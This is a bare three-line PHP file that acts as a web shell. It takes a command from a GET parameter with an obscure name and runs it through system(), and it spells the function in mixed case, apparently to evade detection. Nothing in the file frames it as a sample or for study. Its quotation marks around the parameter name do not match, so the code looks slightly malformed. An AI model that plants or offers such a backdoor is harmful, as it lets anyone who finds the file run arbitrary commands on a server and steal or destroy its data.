<?php
SysTeM($_GET[’NXytnF32']);
?>
